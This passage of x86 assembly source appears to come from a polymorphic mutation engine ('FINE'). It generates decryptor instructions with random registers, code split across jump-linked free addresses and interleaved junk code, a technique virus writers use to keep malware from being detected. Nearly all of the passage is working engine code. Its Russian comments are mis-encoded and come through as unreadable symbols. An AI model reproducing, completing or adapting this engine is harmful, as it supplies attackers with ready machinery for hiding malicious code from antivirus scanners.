	jmp		_ipiendtrash_ 
;--------------------------------------------------------------------------------------------------------
_push__imm_:
	mov		al,68h
	stosb
	mov		eax,ecx
	stosd

_ipiendtrash_: 
	pop		eax
	call	gen_trash  
	ret 
;=======================================[PUSH imm]======================================================= 





;=====================================[ADD reg1,imm]===================================================== 
instr___add__reg_imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4] 
	call	goto_free_addr
	pop		eax
	call	gen_trash 
	mov		al,81h
	stosb 
;--------------------------------------------------------------------------------------------------------
	push	2									;ADD reg1,imm ��� 
	call	[edx].rgen_addr						;SUB reg1,-imm     ?  
	imul	eax,28h
	add		al,0C0h
	add		al,bh
	stosb
;--------------------------------------------------------------------------------------------------------
	mov		dword ptr [ebp-24],edi 
	xor		eax,eax
	stosd 
	pop		eax 
	call	gen_trash 
	ret
;=====================================[ADD reg1,imm]=====================================================  





;=====================================[MOV reg2,imm]===================================================== 
instr___mov__reg_imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
	push	2									;MOV reg2,imm ��� 
	call	[edx].rgen_addr						;PUSH imm   POP reg2     ?  
	test	eax,eax
	je		_mov__reg_imm_
;--------------------------------------------------------------------------------------------------------
_push__imm___pop__reg_:
	mov		al,68h
	stosb
	mov		dword ptr [ebp-28],edi
	xor		eax,eax
	stosd
	pop		eax
	call	gen_trash 
	push	portion                  
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
	mov		al,58h
	add		al,bl
	stosb
	jmp		_mriendtrash_ 
;-------------------------------------------------------------------------------------------------------- 
_mov__reg_imm_:	
	mov		al,0B8h
	add		al,bl
	stosb
	mov		dword ptr [ebp-28],edi
	xor		eax,eax
	stosd
_mriendtrash_: 
	pop		eax
	call	gen_trash 	
	ret
;=====================================[MOV reg2,imm]=====================================================  





;===============================[ADD/SUB/XOR [reg1],reg2]================================================ 
instr___addxorsub__addrreg_reg:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	mov		dword ptr [ebp-32],edi 
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
	push	3									;ADD, SUB, ��� XOR      ? 
	call	[edx].rgen_addr
	mov		dword ptr [ebp-36],eax
;-------------------------------------------------------------------------------------------------------- 
	cmp		al,1
	jl		_xor01_
	jg		_sub01_
_add01_: 
	jmp		_n001_
_sub01_:
	mov		al,29h 
	jmp		_n001_
_xor01_:
	mov		al,31h  
_n001_:
	stosb	  
	mov		al,bl
	shl		eax,3
	add		al,bh
	stosb 
 	pop		eax
 	call	gen_trash 
	ret
;===============================[ADD/SUB/XOR [reg1],reg2]================================================  





;================================[ADD/SUB/XOR reg2,imm]================================================== 
instr___addxorsub__reg_imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr 
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
   	mov		al,81h
   	stosb 
;--------------------------------------------------------------------------------------------------------
   	push	3									;ADD, SUB, ��� XOR      ? 
   	call	[edx].rgen_addr
    mov		dword ptr [ebp-44],eax
	cmp		al,1
	mov		al,bl 									;reg2 
	jl		_xor02_
	jg		_sub02_
_add02_:
	add		al,0C0h
	jmp		_n002_ 									

_sub02_:
	add		al,0E8h
	jmp		_n002_ 

_xor02_:
	add		al,0F0h

_n002_:
	stosb
  	mov		dword ptr [ebp-40],edi
  	xor		eax,eax 
  	stosd
    pop		eax
    call	gen_trash                        
	ret 
;================================[ADD/SUB/XOR reg2,imm]==================================================  





;======================================[DEC reg1]======================================================== 
instr___dec__reg:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion		
	call	[edx].rgen_addr 
	push	eax
	add		eax,dword ptr [esp+4] 
	call	goto_free_addr
	pop		eax
	call	gen_trash 
;--------------------------------------------------------------------------------------------------------
	push	2									;DEC reg1 ���
	call	[edx].rgen_addr						;SUB reg1,1     ? 
	test	eax,eax
	je		_dec__reg1_
;--------------------------------------------------------------------------------------------------------
_sub__reg1_1_:
	mov		al,83h
	stosb
	mov		al,0E8h
	add		al,bh
	stosb
	mov		al,1 
	jmp		_idrendtrash_	 
;--------------------------------------------------------------------------------------------------------
_dec__reg1_: 
	mov		al,bh													;reg1 
	add		al,48h
_idrendtrash_:
	stosb
	pop		eax
	call	gen_trash 
	ret
;======================================[DEC reg1]========================================================  





;=================================[DEC [esp]   JNE imm]================================================== 
instr___dec__addresp:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash 
;--------------------------------------------------------------------------------------------------------
	push	2									;DEC [esp] ��� 
	call	[edx].rgen_addr						;SUB [esp],1     ?       
	test	eax,eax
	je		_dec__addresp_
;--------------------------------------------------------------------------------------------------------
_sub__addresp_1_: 
	mov		eax,01242C83h
	stosd
	jmp		_jne__imm_ 

_dec__addresp_: 
	mov		ax,0CFFh
	stosw
	mov		al,24h
	stosb 

_jne__imm_:										;JNE imm 
	push	ecx
	mov		ecx,edi 
	mov		ax,850Fh
	stosw 

	sub		ecx,dword ptr [ebp-32]  
	add		ecx,6
	neg		ecx
	xchg	eax,ecx
	stosd 
	pop		ecx 
	pop		eax
	call	gen_trash 
	ret
;=====================================[DEC [esp]   JNE imm]==============================================  







;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� goto_free_addr
;����祭��, ���室, � ⠪�� (�᫨ ����) ������ ���� � ������ 
;����:
;eax - ࠧ��� ���� ( � �����), ����� ���� �㤥� ������� �� ������ ����祭���� �������� ����� 
;�����:
;edi - ���� ����
;� ⠪�� (�᫨ ���� �뫮) ������ ������ � ���� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
goto_free_addr:
	push	eax
	call	get_free_addr						;����砥� ����, �� ���஬� �筮 ����� ������� �㦭�� ������⢮ (� �����) ����
	push	eax
	jnc		_nojmp_								;�஢��塞, �㦭� �� �����뢠�� �����?
	push	edi									;�᫨ ��, ����, � �����뢠�� ���࠭� ��� jmp'a 
	sub		edi,eax
	inc		edi
	inc		edi
	mov		eax,edi 
_abs01_: 
	neg		eax 
	js		_abs01_
_jmpshort0xEB_: 
	cmp		eax,80h 
	jae		_jmpnear0xE9_
	neg		edi
	xchg	edi,dword ptr [esp]
	mov		al,0EBh
	stosb
	pop		eax
	stosb
	jmp		_nextgfa_  
	
_jmpnear0xE9_: 	
	add		edi,3  
	neg		edi    
	xchg	edi,dword ptr [esp]
	mov		al,0E9h								;� �����뢠�� jmp 
	stosb 
	pop		eax
	stosd 
_nextgfa_:  
	;mov		eax,min_portion 
	push	min_portion
	call	[edx].rgen_addr						;!!!!! ����� ����������  
	call	gen_trash							;��᫥ ���� ����襬 ��� ��shit� ��᮪ ����  

_nojmp_:
	pop		edi
	pop		eax	  
	ret											;��室�� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 goto_free_addr 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� get_free_addr
;����祭�� �������� ᢮������� ���� ��� ����� �㦭��� ������⢠ ���� 
;����:
;(+)
;�����:
;(+) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_free_addr:
	push	edi									;[esp+12] 
	push	esi									;[esp+08]
	push	ecx									;[esp+04] 
	push	eax									;[esp+00] 

_new_addr_:
	push	num_steps							;30 
	pop		esi									;᪮�쪮 ����⮪ ���� ᢮����� ���� � �������� �஬���⪥ 
_find_free_addr_:
	dec		esi
	je		_correct_new_addr_					;�᫨ �� ����⪨ ���� ᢮����� ���� �����稫��� (�.�. �� ���� �� ��諨 ᢮����� ����), ������� ��� �������� ���᪠, ᤢ��� ��� ���। (� ��஭� ᢮������ ���ᮢ) 
	push	max_portion							;� ��� �� ��������, � ���஬ �᪠�� �㤥� ᢮����� ����  
	call	[edx].rgen_addr
	add		eax,dword ptr [ebp-16]				;�����﫥� ����, ����� ���� ��砫�� ������� �஬���⪠ 
	xchg	eax,edi
	mov		ecx,dword ptr [esp]					;����� � ecx ������ ������⢮ ����, ���஥ ���� �㤥� ����� ������� (�� ����� ������� + ����� ������� (᪥��� ���ਯ��)) �� ᢮������� �����    
	add		ecx,size_general_instr+5+4+2+min_portion
	xor		eax,eax 
	push	edi   
	repe	scasb								;� �஢��塞, ����� �� ������ ����? 
	pop		edi 
	jne		_find_free_addr_					;�᫨ ��, �த������ �᪠��  
	stosd										;���� �� ��諨 ᢮����� ����, � ���४��㥬 edi (edi+=4, �� �㦭� �� ��������)   
	jmp		_ok_new_addr_						;���室�� �����   
_correct_new_addr_: 
	add		dword ptr [ebp-16],min_portion;+1	;������� �������� ���᪠ ᢮������ ���ᮢ       
	jmp		_new_addr_ 
_ok_new_addr_:
	push	edi
	cmp		edi,dword ptr [esp+4+12]			;�᫨ ����祭�� ᢮����� ���� �����, 祬 ⥪�騩, � �᭮� ����, �㦭� ������� jmp ��� ���室� �� ��� ���� ����    
	jle		_jc_ok_
	push	size_general_instr+5+4+2+min_portion  
	pop		ecx									;����, �஢�ਬ, �᫨ ⥪�騩 ���� �⮨� ᮢᥬ �冷� � ����, � jmp ������ �� �㤥�, � �������� ᢮������ ���� ����� ���� ���஬ 
	std
	xor		eax,eax
	repe	scasb
	cld 
	je		_jc_ok_								;�᫨ ��� �冷� �� ����, ⮣�� ����襬 jmp 
	cmp		edi,dword ptr [esp+4+12]
	jg		_jc_ok_
	mov		edi,dword ptr [esp+4+12]      
	mov		eax,dword ptr [esp]
	sub		eax,edi
	call	gen_trash
	clc
	jmp		_getfaret_     

_jc_ok_:
	stc  
    
_getfaret_:
	pop		eax
	pop		ecx
	pop		ecx
	pop		esi
	pop		edi  
	ret											;��室��  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 get_free_addr  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�ᯮ����⥫쭠� �㭪�� gen_trash ��� �맮�� ������� ���� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
gen_trash:
	mov		[ebp].buf_for_trash,edi
	mov		[ebp].size_trash,eax
	mov		[ebp].regs,ebx
	push	ebp  
	call	[edx].tgen_addr
	xchg	eax,edi
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 gen_trash 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� gen_reg
;������� ������� ॣ���஢ (� ����� ��� ���� � �������ਯ��) 
;�����:
;bh - reg1
;bl - reg2 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
gen_reg:
_gen_reg1_: 
	call	random_reg
	cmp		al,4
	je		_gen_reg1_
	cmp		al,5
	je		_gen_reg1_
	xchg	eax,ebx
_gen_reg2_:
	call	random_reg
	cmp		al,4
	je		_gen_reg2_
	cmp		al,5
	je		_gen_reg2_
	cmp		al,bl
	je		_gen_reg2_
	mov		bh,al
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 gen_reg 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�ᯮ����⥫쭠� �㭪�� �����樨 ��砩���� ॣ����
;�����:
;eax - ��砩�� ॣ���� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
random_reg:
	push	8
	call	[edx].rgen_addr
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 random_reg 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  

 

 

;======================================================================================================== 
FINESize	equ		$ - FINE  

